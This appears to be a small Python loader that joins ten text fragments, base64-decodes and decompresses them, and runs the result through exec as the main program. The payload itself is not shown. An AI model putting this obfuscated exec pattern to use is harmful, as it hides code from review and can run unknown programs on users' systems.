import zlib, base64
from pathlib import Path
_b = "".join(Path(__file__).with_name(f"_zb{i}.txt").read_text().strip() for i in range(10))
_code = zlib.decompress(base64.b64decode(_b)).decode()
exec(compile(_code, str(Path(__file__).with_name("app_body.py")), "exec"), {"__name__": "__main__", "__file__": str(Path(__file__).resolve())})
